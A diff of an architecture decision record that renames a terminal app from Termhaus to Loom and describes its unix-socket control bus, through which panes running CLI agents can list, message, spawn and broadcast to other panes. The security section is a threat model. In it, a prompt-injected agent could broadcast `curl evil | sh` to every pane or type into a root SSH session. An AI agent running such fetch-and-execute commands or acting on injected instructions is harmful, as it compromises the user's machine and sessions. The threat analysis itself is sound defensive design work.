@@ -5,7 +5,7 @@ address another pane — by design, panes are opaque byte streams (ADR-0001) and
 control surface is Tauri commands callable from the webview. But "from this agent, kick
 off a second agent in the **Cleo** pane and hand it a task" is a core fleet-driving
 workflow. We add an explicit, opt-in **control bus** so a pane process can `list`, `send`
-to, and `spawn` panes — without breaking opacity (Termhaus still never reads pane *output*;
+to, and `spawn` panes — without breaking opacity (Loom still never reads pane *output*;
 this is a separate inbound command channel the user's processes call deliberately).
 
 ## Decision
@@ -18,10 +18,10 @@ TS/SolidJS.
 The round trip is **opaque to Rust** — it forwards a request *string*, never parsing the
 protocol:
 
-1. `th` (a tiny second cargo binary, std-only) connects to `$TERMHAUS_SOCK` and writes one
+1. `loom` (a tiny second cargo binary, std-only) connects to `$LOOM_SOCK` and writes one
    newline-delimited JSON request, then blocks for one JSON response line.
 2. The Rust accept loop reads the line, assigns a `reqId` (u32), parks the connection on a
-   oneshot channel in a `PendingReplies` map, and emits a `termhaus://pane-cmd` Tauri event
+   oneshot channel in a `PendingReplies` map, and emits a `loom://pane-cmd` Tauri event
    carrying `{ reqId, request }` — the raw request string, unparsed.
 3. The frontend (`src/lib/paneControl.ts`) listens, parses the JSON, dispatches:
    - `list` → enumerate panes from the workspace store (name/live/focused/workspace),
@@ -31,9 +31,9 @@ protocol:
    It then calls the `pane_cmd_reply(reqId, response)` command with a JSON result string.
 4. Rust matches `reqId` back to the parked connection, writes the response line, closes.
 
-**Discovery via env.** Each PTY child gets `TERMHAUS_SOCK` (socket path), `TERMHAUS_PANE`
-(its own pane name, so an agent can say "spawn next to me"), and `TERMHAUS_CLI` (absolute
-path to `th`); the CLI's directory is also prepended to the child `PATH`, so `th` is
+**Discovery via env.** Each PTY child gets `LOOM_SOCK` (socket path), `LOOM_PANE`
+(its own pane name, so an agent can say "spawn next to me"), and `LOOM_BIN` (absolute
+path to `loom`); the CLI's directory is also prepended to the child `PATH`, so `loom` is
 directly invokable inside any pane in dev and packaged builds alike.
 
 **Name resolution** prefers the active workspace, then falls back to a unique match across
@@ -43,8 +43,8 @@ frontend's `spec.title` (the NAME_POOL: Faye, Cleo, …) — there is no name re
 ## Why a unix socket (not TCP, not stdin tricks)
 
 - **Same-user trust boundary for free.** The socket lives at
-  `$XDG_RUNTIME_DIR/termhaus.sock` (dir is mode 0700) or `/tmp/termhaus-<uid>.sock`, created
-  mode 0600. Only the user who launched Termhaus can connect — which is exactly the set of
+  `$XDG_RUNTIME_DIR/loom.sock` (dir is mode 0700) or `/tmp/loom-<uid>.sock`, created
+  mode 0600. Only the user who launched Loom can connect — which is exactly the set of
   principals who can already drive the user's terminals by other means. No network exposure.
 - **No new dependencies.** `std::os::unix::net` on the Rust side; `serde_json` (already a
   dep) for framing. The CLI is a second `[[bin]]` in the same crate.
@@ -54,7 +54,7 @@ frontend's `spec.title` (the NAME_POOL: Faye, Cleo, …) — there is no name re
 ## Security model (and its one sharp edge)
 
 The bus grants **every pane ambient authority over every other pane**: any process holding
-`$TERMHAUS_SOCK` can `send`/`broadcast` keystrokes into other panes and `spawn` new
+`$LOOM_SOCK` can `send`/`broadcast` keystrokes into other panes and `spawn` new
 command-running panes. Rust attaches no caller identity (it's a pure relay) and the TS
 dispatch enforces no per-pane permissions. The trust boundary is therefore **the OS user**:
 the socket is same-user-only (§"Why a unix socket"), and any process running as that user can
@@ -62,8 +62,8 @@ already drive the terminals by other means.
 
 That assumption holds *only if every pane is mutually trusted*. It is in tension with the
 product's own purpose — driving **CLI agents**, which are prompt-injectable: a poisoned agent
-in one pane could call `th broadcast 'curl evil | sh'` (runs in every other pane's shell) or
-`th send <other> …` (runs in a specific, possibly more-privileged session such as an open
+in one pane could call `loom broadcast 'curl evil | sh'` (runs in every other pane's shell) or
+`loom send <other> …` (runs in a specific, possibly more-privileged session such as an open
 `ssh root@host`). We accept this as the baseline model rather than build a full per-pane
 capability system, because:
 
@@ -75,7 +75,7 @@ capability system, because:
   explicit **user confirmation** before it runs (Settings → Behaviour →
   *Confirm before another pane spawns a terminal*, default **on**;
   `settings.confirmExternalSpawn`, enforced in `paneControl.ts`'s `spawn` dispatch). The
-  confirmation covers both the `th` CLI and the `th-mcp` MCP server, since both funnel through
+  confirmation covers both the `loom` CLI and the `loom mcp` MCP server, since both funnel through
   the same relay → dispatch.
 
 If a future use case runs genuinely untrusted third-party agents, the next step is a per-pane
@@ -95,4 +95,4 @@ inbound `send`/`broadcast`/`spawn` unless marked controllable). Tracked, not bui
 - Linux-only (unix sockets). A Windows port would swap the transport (named pipe) behind the
   same event/reply contract; out of scope for the Linux-first v1.
 - If the webview isn't listening yet (startup race) or no pane matches, the request times
-  out / returns an error and `th` exits non-zero — it never hangs a pane indefinitely.
+  out / returns an error and `loom` exits non-zero — it never hangs a pane indefinitely.
